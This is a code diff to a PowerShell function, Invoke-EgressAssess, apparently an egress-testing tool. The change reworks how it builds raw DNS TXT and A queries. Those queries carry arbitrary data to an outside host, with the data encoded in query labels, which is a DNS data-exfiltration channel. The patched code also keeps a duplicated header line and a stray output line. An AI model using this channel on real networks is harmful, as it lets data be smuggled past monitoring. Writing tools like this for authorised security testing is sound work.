@@ -2215,7 +2215,8 @@ function Invoke-EgressAssess
                 break
             }
         }
-                function Send-DNSPacket
+        
+        function Send-DNSPacket
         {
             Param($dataX, $txt=$false);
 
@@ -2223,20 +2224,22 @@ function Invoke-EgressAssess
             {
                 $Port = 53
             }
-            #DNS TXT Query "Header"
-            #Trans ID  std query  
-            [Byte[]]$Mess=0x00,0x01,0x05,0x00,0x00
-                    
-            #Ans       Auth    Add RR
-            [Byte[]]$Mess2= 0x00,0x00,0x00
+
                     
             #no. of queries
             $Mess = $Mess + [Bitconverter]::GetBytes([int]1) +$Mess2
-
+            $dns_Servers = @()
             if ($txt)
             {
-                $dns_Servers.Add(([System.Net.Dns]::GetHostAddresses($IP))[0].IPAddresstoString)
+                #DNS TXT Query "Header"
+                #Trans ID  std query  
+                [Byte[]]$Mess=0x00,0x01,0x05,0x00,0x00
+                    
+                #Ans       Auth    Add RR
+                [Byte[]]$Mess2= 0x00,0x00,0x00
 
+                $dns_Servers += [System.Net.Dns]::GetHostAddresses($IP)[0].IPAddresstoString
+                $dns_Servers
                 ###DNS TXT Query "Footer"
                 #suffix for each q
                 #        null     type    class 
@@ -2244,12 +2247,20 @@ function Invoke-EgressAssess
             }
             else #type A
             {
+                #DNS TXT Query "Header"
+                #Trans ID  std query  
+                [Byte[]]$Mess=0x00,0x00,0x01,0x00,0x00
+                    
+                #Ans       Auth    Add RR
+                [Byte[]]$Mess2= 0x00,0x00,0x00
+
                 $dns_Servers =  ipconfig /all | where-object {$_ –match “DNS Servers”} | foreach-object{$_.Split(“:”)[1]}
                 
-                $postS = 0x00,0x00,0x10,0x00,0x01
+                $postS = 0x00,0x00,0x01,0x00,0x01
                 $dataX +=".$IP"
             }
-            
+            #no. of queries
+            $Mess = $Mess + [Bitconverter]::GetBytes([int]1) +$Mess2
             foreach($addr in $dns_servers)
             {
                 try
@@ -2266,13 +2277,17 @@ function Invoke-EgressAssess
                 $Sock.ReceiveTimeout=3000
 
                 [Byte[]]$fullQ = @()
- 
-                $data1 = [System.Text.Encoding]::ASCII.GetBytes($dataX)
-                $len1 = [bitconverter]::GetBytes($data1.Length)
-                $len1 = @($len1[0])
-                    
-                $fullQ = $len1
-                $fullQ+=$data1 
+                
+                $data2 = $dataX.Split('.')
+                foreach ($d2 in $data2)
+                {
+                    $data1 = [System.Text.Encoding]::ASCII.GetBytes($d2)
+                    $len1 = [bitconverter]::GetBytes($data1.Length)
+                    $len1 = @($len1[0])
+                    $fullQ+= $len1
+                    $fullQ+=$data1 
+                }
+                   
                 $fullQ+=$postS
 
                 $Buffer = $Mess + $fullQ
